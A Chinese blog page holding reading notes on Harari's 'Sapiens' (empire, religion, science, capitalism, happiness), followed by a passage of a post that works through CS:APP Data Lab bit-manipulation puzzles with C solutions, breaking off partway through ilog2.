<h3 id="帝国"><a href="#帝国" class="headerlink" title="帝国"></a>帝国</h3><p>正因为古罗马在努曼西亚大获全胜，所以这些胜利者才会保留下了战败者的那些回忆。这种情节不太符合我们的品味，我们爱看的是反败为胜，是小人物的胜利。然而，历史就是没有正义。多数过去的文化，早晚都是遭到某些无情帝国军队的蹂躏，最后在历史上彻底遭到遗忘。就算是帝国本身最后也将崩溃，只是常常留下丰富而流传千古的遗产。在21世纪，几乎所有人的祖先都曾经属于某个帝国。</p>
<p>帝国是一种政治秩序，有两项重要特征。第一，帝国必须统治者许多不同的民族，各自拥有不同的文化认同和独立的领土。第二，帝国的特征是疆域可以灵活调整，而且几乎可以无限扩张。帝国的定义就只在与文化多元性和疆界灵活性两项，至于起源、政府形式、领土范围或人口规则并非重点。</p>
<p>文化多元性和疆界灵活性，不仅让帝国独树一格，更让帝国站到了历史的核心。正式这两项特征，让帝国能够在单一的政治构架下纳入多元的族群与生态区，让越来越多人类与整个地球逐渐融合为一。帝国正是造成名族多样性大幅减少的主因之一。帝国就像一台压路机，将许多名族独特性逐渐夯平，整合制造出他们更大的新群体。现在人类之所以有许多文化成就，常常背后考的就是剥削战败者。</p>
<p>中国这个帝国的最高成就就在于它仍然生龙活虎。有些人可能会怀疑它究竟算不算帝国，但只要看看偏远地区的西藏、新疆等地，就能知道此话不假。现在有超过九成的中国人口无论是自认为或是在他人眼中，都算是汉族。</p>
<p>现存的所有人类文化，至少都有一部分是帝国和帝国文明的遗绪，任何以学术或政治为名的手术，如果想把所有帝国的部位一次切除，病人也就必然魂归九霄。</p>
<h3 id="宗教"><a href="#宗教" class="headerlink" title="宗教"></a>宗教</h3><p>我们今天常认为宗教造成的是歧视、争端、分裂。但在金钱和帝国外，宗教正是第三种让人类统一的力量。</p>
<p>宗教是「一种人类规范及价值观的系统，建立在超人类的秩序之上」。这里有两大基本要素：</p>
<ol>
<li>宗教认为世界有一种超人类的秩序，而且并非出于人类的想象或是协议。</li>
<li>以这种秩序为基础，宗教会发展出它认为具有约束力的规范和价值观。<br>换句话说，宗教必须同时具备「普世特质」和「推广特质」。</li>
</ol>
<p>有神论的宗教，重点在于神的崇拜；至于人文主义宗教，重点就是对人的崇拜，或者将得更明确，就是对智人的崇拜。人文主义的基本信念，就是认为智人是独特的、神圣的，从本质上就与其他现代动物有所不同。社会人文主义者认为所谓「人性」是个集体而非个人的概念。因此他们认为神圣的不是每个个人心中的声音，而是有所有智人这种物种所构成的整体。自由人文主义追求的，是尽可能为个人争取更多自由；而社会人文主义追求的，则是所有人都能平等。</p>
<h3 id="成功的秘密"><a href="#成功的秘密" class="headerlink" title="成功的秘密"></a>成功的秘密</h3><p>商业、帝国和全球性的宗教，最后终于将几乎每个智人都纳入了我们今天的全球世界。这个扩张和统一的过程并不是完全直线发展、一帆风顺。但纵观大局，可以看到从许多小文化到少数大文化再到最后的全球单一文化，应该是人类历史无法避免的结果。</p>
<p>历史的铁则就是：时候看来无可避免的事，在当时看来总是好不明显。</p>
<p>究竟为什么要学习历史？历史不想是物理学或经济学，目的不在于做出准确预测。我们之所以研究历史，不是为了要知道未来，而是要拓展视野，要了解现在的种种绝非「自然」，也并非无可避免。未来的可能性远超过我们的想象。</p>
<p>历史的选择绝不是为了人类的利益。随着历史演进，毫无证据显示人类的福祉必然提升。没有任何证据，证明对人类有益的文化就会成功扩张，而对人类无情的文化就会消失。没有任何证据，证明基督教是比摩尼教更好的选择，或证明阿拉伯帝国比波斯帝国对人类更有利。</p>
<h2 id="科技革命"><a href="#科技革命" class="headerlink" title="科技革命"></a>科技革命</h2><p>如果要在过去500年间挑出一个最重大、最具代表性的一刻，一定就是1945年7月16日上午5点29分45秒。就在这一秒美国科学家在新墨西哥的阿拉莫戈多引爆了第一颗原子弹。从这时开始，人类不仅有了改变历史进程的能力，更有了结束历史进程的能力。将人类带到阿拉莫戈多、带上月球这段历史进程，称为「科学革命」。在这场革命中，人类因为将资源投入科学研究，取得了巨大的新力量。</p>
<p>现代科学与先前的知识体系有三大不同之处：</p>
<ol>
<li>愿意承认自己的无知。我们承认了自己并非无所不知。更重要的是，我们也愿意在知识进展之后，承认过去相信的可能是错的。于是，再也没有什么概念、想法或者理论是神圣不可挑战的。</li>
<li>以观察和数学为中心。承认无知之后，现代科学还希望能获得新知。方式则是通过收集各种观察值，再用数学工具整理连接，形成全面的理论。</li>
<li>取得新能力。光是创造理论，对现代科学来说还不够。它希望能够运用这些理论来取得新的能力，特别是发展出新的科技。<br>科学革命并不是「知识的革命」，而是「无知的革命」。真正让科学起步的伟大发现，就是发现「人类对于最重要的问题其实毫无所知」。</li>
</ol>
<p>科学并不是处于某个更高的道德和精神层面，而是也像其他文化活动一样，收到经济、政治和宗教利益的影响。科学研究之所以能够得到经费，多半是因为有人认为这些研究有助于达到某些政治、经济或宗教的目的。科学并无力决定自己的优先级，也无法决定如何使用其发展。研究一定得和某些宗教或意识形态联手，才有蓬勃发展的可能。意识形态能够让研究所耗的成本合理化。而代价就是意识形态能够影响科学的进程表，并且决定如何使用研究成果。</p>
<p>在过去500年间，科学、帝国和资本主义之间的回馈循环无疑正式推动历史演进的主要引擎。</p>
<h3 id="科学与帝国"><a href="#科学与帝国" class="headerlink" title="科学与帝国"></a>科学与帝国</h3><p>虽然我们常常不愿意承认，但现在全球所有人的穿着、想法和品味几乎就都是欧洲人的穿着、想法和品味。</p>
<p>从1850年起，欧洲之所以能够称霸世界很大程度靠的就是军事、工业和科学领域的合作，以及如同巫术般神妙的科技。</p>
<p>中国和波斯其实并不缺乏制作蒸汽机的科技，他们缺乏的是西方的价值观、故事、司法系统和社会政治结构，这些在西方花了数个世纪才形成即成熟，就算想要照抄，也无法在一夕之间内化。之所以法国和美国能很快赶上英国的脚步，是因为它们本来就和英国共享一套最重要的故事和社会结构。而中国和波斯总是追赶不及，则是因为整个关于社会的想法和组织就是不同。</p>
<p>欧洲帝国远征改变了世界的历史：原本一些独立的民族和文化各自发展，现在则成了单一的人类社会进程。</p>
<p>科学能够从思想上让帝国合理化。正是帝国创造了我们所认识的世界，而且，其中还包括我们用以判断世界的意识形态。</p>
<h3 id="资本主义"><a href="#资本主义" class="headerlink" title="资本主义"></a>资本主义</h3><p>不论结果是好是坏，究竟是生病还是健康，现代经济就像是一个荷尔蒙过剩的青少年一样不断成长，吞噬着它看到的一切，而且成长的速度叫人跟不上。</p>
<p>「信任」就是世界上绝大多数金钱的唯一后盾。</p>
<p>正式「信用」的概念，让我们能够预支未来、打造现在。而这背后有一项基本的假设，就是未来的资源肯定远远超过目前的资源；只要我们使用未来的收入来投资当下，就会带来许多全新而美好的商机。</p>
<p>资本主义的基本原则在于，因为不论是正义、自由甚至块垒都必须依赖于经济增长，所以可说经济成长就是至善。</p>
<p>自由市场的美中不足就在于，它无法保证利润会以公平的方式取得或是以公平的方式分配。</p>
<h3 id="工业革命和社会革命"><a href="#工业革命和社会革命" class="headerlink" title="工业革命和社会革命"></a>工业革命和社会革命</h3><p>工业革命的核心，其实就是能源转换的革命。显然，这世界上缺的不是能源，而是能够驾驭并装换符合我们所需的知识。</p>
<p>人类有史以来最大的社会革命是：家庭和地方社群崩溃，改由国家和市场取代。</p>
<p>消费主义和名族主义可说是夙夜匪懈，努力说服我们自己和其他数百万人是一伙的，认为我们有共同的过去、共同的利益以及共同的未来。这并不是谎言，而是一场想象。</p>
<p>我们比较容易体会个人的辛酸，而不是人类整体的苦难。</p>
<p>正因为全球帝国的疆域就是全世界，所以世界和平也就能得到有效地维持。</p>
<p>目前大多数的意识形态和政治纲领，虽然都说要追求人类幸福，但对于幸福快乐的真正来源为何却还是不明就里。</p>
<p>虽然智人确实取得了空前的成就，或许值得沾沾自喜，但代价就是配上几乎所有其他动物的命运。</p>
<p>快乐并不自傲与任何像是财富、健康甚至社群之类的客观条件，而在于客观条件和主管期望之间是否相符。</p>
<p>我们在试着猜测会想象其他人有多快乐的时候，我们总是想要设身处地去想想自己在那个情况下会如何感受。</p>
<p>我们对生活所赋予的任何意义，其实都只是错觉。</p>
<p>这么说来，所谓的快乐，很可能只是让个人对意义的错觉和现行的集体错觉达成同步而已。只要我们自己的想法能和身边的人的想法达成一致，我就能说服自己、觉得自己的生命有意义，而且也能从这个信念中得到快乐。</p>
<h2 id="人类的末日"><a href="#人类的末日" class="headerlink" title="人类的末日"></a>人类的末日</h2><p>阿巴的出现其实代表着一股潜力，如果这股潜力完全发挥（而且人类没有因此灭亡），科学革命很可能就远远不只是历史学上的一场革命而已。这很有可能会成为地球出现以来最重要的生物学革命。</p>
<p>人类很难接受的一个事实就是，科学家不仅能够改造身体，也能改造心灵，未来创造出来的科学怪人可能就是硬生生比人类优秀不知凡几，他们看着我们，就像是我们看尼安特人一样带着一种轻蔑和不屑。</p>
<p>拥有神的能力，但是不负责任、贪得无厌，而且连想要什么都不知道。天下危险，恐怕莫此为甚。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/03/12/csapp-datalab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/03/12/csapp-datalab/" class="post-title-link" itemprop="url">【深入理解计算机系统实验笔记】| Data Lab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2017-03-12 17:31:23" itemprop="dateCreated datePublished" datetime="2017-03-12T17:31:23+08:00">2017-03-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-28 17:41:58" itemprop="dateModified" datetime="2020-06-28T17:41:58+08:00">2020-06-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/computer-science/" itemprop="url" rel="index"><span itemprop="name">计算机科学</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/03/12/csapp-datalab/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/03/12/csapp-datalab/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近阅读「深入理解计算机系统」，并在读书的过程中完成练习题和章节附带实验。<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">实验一</a>是「信息的表示和处理」章节的实验，主要考察对有/无符号整数、浮点数在 bite 级别存储和操作的理解。</p>
<h2 id="总体要求"><a href="#总体要求" class="headerlink" title="总体要求"></a>总体要求</h2><p>实验对可使用的操作、数字有严格的要求：</p>
<ol>
<li>使用的整数必须在 0~255(0xFF)之间，而不允许使用大的常量，如：0xFFFFFFFF</li>
<li>不可以使用全局变量</li>
<li>在整数上可以使用的一元运算符只有：! 和 ~</li>
<li>在整数上可以使用的二元运算符只有：&amp; ^ | + &lt;&lt; &gt;&gt;</li>
<li>对个别题目的限制可能会略微放宽，如允许使用循环</li>
<li>每个答案会限制允许的最大操作数</li>
<li>在完成实验后，可以使用 dlc 工具检查代码的格式和操作数是否符合要求，使用 btest 检查结果是否通过测试。</li>
</ol>
<h2 id="题目及思路"><a href="#题目及思路" class="headerlink" title="题目及思路"></a>题目及思路</h2><h3 id="bitAnd"><a href="#bitAnd" class="headerlink" title="bitAnd"></a>bitAnd</h3><ul>
<li>要求：计算 <code>x &amp; y</code> 的值</li>
<li>允许操作：<code>~ |</code></li>
<li>操作数限制：8次</li>
</ul>
<p>使用了简单的逻辑推导</p>
<p>$$ <del>(x &amp; y) = (</del>x) | (<del>y) ==&gt; (x &amp; y) = ~((</del>x) | (~y)) $$</p>
<p>可以得到答案：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * ~(x &amp; y) = (~x) | (~y)</span></span><br><span class="line"><span class="comment">   * ==&gt; (x &amp; y) = ~((~x) | (~y))</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">return</span> ~((~x) | (~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="getByte"><a href="#getByte" class="headerlink" title="getByte"></a>getByte</h3><ul>
<li>要求：得到 <code>x</code> 中第 n 个字节</li>
<li>n 的范围：[0, 3]</li>
<li>允许操作：<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>操作数限制：6</li>
</ul>
<p>以 x=0x12345678 为例，<code>getByte(x, 0)=0x78</code>, <code>getByte(x, 1)=0x56</code>。我使用了 0xff 作为 mask，将 x 的指定字节移动到低位后与 mask 做 <code>&amp;</code> 运算得到结果。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getByte</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x &gt;&gt; (n &lt;&lt; <span class="number">3</span>)) &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>做完成这个题目的时候，我犯了一个错误。我认为整数在以 Intel 作为芯片的计算机使用小端存储，所以<code>0x12345678</code>在内存中的布局应该是<code>0x78 0x56 0x34 0x12</code>，那么如果要取得第 n 个字节的话，首先应该将<code>x</code>右移<code>(3 - n) * 8</code>位。按照我的错误理解，自然也得到了错误地结果。后来我在认识到：<strong>大/小端存储仅仅关系到整数的字节在内存的布局方式，当整数被加载在 CPU 中之后，字节的布局方式就不再存在大/小端的问题了</strong></p>
<blockquote>
<p>Endianness only matters for layout of data in memory. As soon as data is loaded by the processor to be operated on, endianness is completely irrelevent. Shifts, bitwise operations, and so on perform as you would expect (data logically laid out as low-order bit to high) regardless of endianness</p>
</blockquote>
<h3 id="logicalShift"><a href="#logicalShift" class="headerlink" title="logicalShift"></a>logicalShift</h3><ul>
<li>要求：将 <code>x</code> 逻辑右移 n 位</li>
<li>假定 <code>0 &lt;= n &lt;= 31</code></li>
<li>允许操作：<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>操作数限制：20</li>
</ul>
<p>这个问题主要是要解决负数右移后会在高位进行<a href="https://en.wikipedia.org/wiki/Sign_extension" target="_blank" rel="noopener">符号扩展</a>的问题，需要在将 x 右移后将高位拓展后的位清零。所以我使用<code>~(((0x1 &lt;&lt; 31) &gt;&gt; n) &lt;&lt; 1)</code>作为 mask 将「扩展位」清零。这里用到的小技巧就是将<code>(0x01 &lt;&lt; 31)</code>右移可以得到在高位做符号扩展从而得到模板，如<code>((0x1 &lt;&lt; 31) &gt;&gt; 8)</code>可以得到<code>0xff000000</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalShift</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x &gt;&gt; n) &amp; ~(((<span class="number">0x1</span> &lt;&lt; <span class="number">31</span>) &gt;&gt; n) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="bitCount"><a href="#bitCount" class="headerlink" title="bitCount"></a>bitCount</h3><ul>
<li>要求：得到在某个字中为 1 的 bit 个数</li>
<li>允许操作：<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>操作数限制：40</li>
</ul>
<p>这个题目我不会做，在网上找到了<a href="https://en.wikipedia.org/wiki/Hamming_weight" target="_blank" rel="noopener">Hamming weight</a>算法。这个算法的思想使用分治策略，先计算每两个相邻的 bit 中有多少个 1，之后再依次求解在4、8、16、32个 bit 中共有多少个 1。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitCount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  x = (x &amp; <span class="number">0x55555555</span>) + ((x &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>);</span><br><span class="line">  x = (x &amp; <span class="number">0x33333333</span>) + ((x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x33333333</span>);</span><br><span class="line">  x = (x &amp; <span class="number">0x0F0F0F0F</span>) + ((x &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F0F0F0F</span>);</span><br><span class="line">  x = (x &amp; <span class="number">0x00FF00FF</span>) + ((x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x00FF00FF</span>);</span><br><span class="line">  x = (x &amp; <span class="number">0x0000FFFF</span>) + ((x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>);</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个算法还有优化空间，所以也有使用更少操作的实现方法，但是我认为这个基础版本是最容易读的，用户体验更好。该问题及其他高效实现在<a href="http://stackoverflow.com/questions/109023/how-to-count-the-number-of-set-bits-in-a-32-bit-integer" target="_blank" rel="noopener">StackOverflow</a></p>
<h3 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h3><ul>
<li>要求：计算 <code>!x</code></li>
<li>允许操作：<code>~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>操作数限制：12</li>
</ul>
<p>这个题目要注意的一点就是在 C 语言中<code>||</code>、<code>&amp;&amp;</code>和<code>!</code>是<strong>逻辑运算</strong>，而<code>~</code>、<code>&amp;</code>、<code>|</code>和<code>^</code>是<strong>位级运算</strong>。在逻辑运算中，任何<strong>非零</strong>参数都是表示 True，0 表示 False。所以<code>bang(3)=bang(-3)=0</code>，而<code>bang(0)=1</code>。我们知道在整数的补码表示中<code>+0</code>和<code>-0</code>的符号为都为 0。根据这个特点，可以得到解法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> negx = ~x + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> x_sign = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">  <span class="keyword">int</span> negx_sign = (negx &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (x_sign | negx_sign) ^ <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><ul>
<li>要求：返回使用2进制补码表示的最小的整数</li>
<li>允许操作：<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>操作数限制：4</li>
</ul>
<p>了解补码的表示方式后，直接返回<code>0x80000000</code>即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fitsBits"><a href="#fitsBits" class="headerlink" title="fitsBits"></a>fitsBits</h3><ul>
<li>要求：如果<code>x</code>可以被 n 位的2进制补码表示则返回1，否则返回0</li>
<li>假定<code>1 &lt;= n &lt;= 32</code></li>
<li>允许操作：<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>操作数限制：15</li>
</ul>
<p>n 位补码能够表示的数的范围是$[-2^{n-1}, 2^{n-1}-1]$，所以如果在这个范围内则返回1，否则返回0。如果<code>x</code>大于$2^{n-1}-1$，则会发生正溢出，得到负数；如果<code>x</code>小于$-2^{n-1}$则会发生负溢出。所以题目的求解方法就是将<code>x</code>的符号位从第 n 位拓展到第32位得到<code>extened_x</code>，之后通过判断<code>x == exntened_x</code>来判断是否发生了溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitsBits</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> shiftNum = <span class="number">32</span> + (~n + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> !(((x &lt;&lt; shiftNum) &gt;&gt; shiftNum) ^ x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="divpwr2"><a href="#divpwr2" class="headerlink" title="divpwr2"></a>divpwr2</h3><ul>
<li>要求：计算$x/2^{n}$，并向零舍入</li>
<li>假定<code>0 &lt;= n &lt;= 30</code></li>
<li>允许操作：<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>操作数限制：15</li>
</ul>
<p>因为当<code>x &gt; 0</code>时，<code>x &gt;&gt; n</code>会自动向下(向零)舍入，我们不需要做特殊操作。所以在整数<code>x</code>除以$2^{n}$时主要是要实现当<code>x &lt; 0</code>时的向零(向上)舍入，实现方法就是为<code>x</code>添加一个偏移值<code>bias = (1 &lt;&lt; n) - 1</code>，计算<code>(x + bias) &gt;&gt; k</code>。</p>
<blockquote>
<p>在为 <code>x</code> 添加偏移量后，低 k 位左边的位可能会加 1，也可能不会加 1。对于不需要舍入的情况，加上偏移量只影响那些被移除的位；对于需要舍入的情况，加上偏移量导致较高的位加 1，所以结果会向零舍入。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divpwr2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> bias = sign &amp; ((<span class="number">1</span> &lt;&lt; n) + (~<span class="number">0</span>));</span><br><span class="line">  <span class="keyword">return</span> (x + bias) &gt;&gt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><ul>
<li>要求：计算 -x</li>
<li>允许操作：<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>操作数限制：5</li>
</ul>
<p>在整数的补码表示中 <code>-x = (~x) + 1</code>，所以程序很简单：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="isPositive"><a href="#isPositive" class="headerlink" title="isPositive"></a>isPositive</h3><ul>
<li>要求：如果<code>x &gt; 0</code>返回1，否则返回 0</li>
<li>允许操作：<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>操作数限制：8</li>
</ul>
<p>利用向右算术移位运算中的符号拓展原则，如果<code>x &lt; 0</code>那么<code>x &gt;&gt; 31</code>会得到 0xFFFFFFFF。注意还要处理<code>x = 0</code>的情况。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isPositive</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !((x &gt;&gt; <span class="number">31</span>) | (!x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><ul>
<li>要求：如果<code>x &lt;= y</code>返回 1，否则返回 0</li>
<li>允许操作：<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>操作数限制：24</li>
</ul>
<p>只判断三种情况：</p>
<ol>
<li>x &lt; 0 并且 y &gt; 0</li>
<li>x 和 y 的符号位相同，并且 x - y &lt; 0</li>
<li>x = y</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> signx = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">  <span class="keyword">int</span> signy = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">  <span class="keyword">int</span> differ = x + (~y + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">int</span> sign_d = (differ &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">  <span class="keyword">return</span> (signx &amp; (!signy)) | ((!(signx ^ signy)) &amp; sign_d) | (!(x ^ y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ilog2"><a href="#ilog2" class="headerlink" title="ilog2"></a>ilog2</h3><ul>
<li>要求：计算$log_2^{x}$，向下舍入</li>
<li>允许操作：<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>操作数限制：90</li>
</ul>
<p>看这道题目的操作数的限制，就知道很有难度。因为在得到结果后需要向下舍入，所以我们只需要判断<code>x</code>的补码表示中最高位<code>1</code>的位置，或者说要得到最高位<code>1</code>后面的位数。这里主要是使用了类似分治的策略：考虑字的左边 16 位是否为全 0，如果是的话，不做任何操作，如果不为全零的话，说明最高位的<code>1</code>在<code>x</code>补码表示的左半边，那么可以通过右移“砍掉”右半边的数字，并记录被“砍掉”的位数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> shift1, shift2, shift3, shift4, shift5;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> sign = !!(x &gt;&gt; <span class="number">16</span>);</span><br><span class="line">  shift1 = sign &lt;&lt; <span class="number">4</span>;</span><br><span class="line">  x = x &gt;&gt; shift1;</span><br><span class="line"></span><br><span class="line">  sign = !!(x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  shift2 = sign &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  x = x &gt;&gt; shift2;</span><br><span class="line"></span><br><span class="line">  sign = !!(x &gt;&gt; 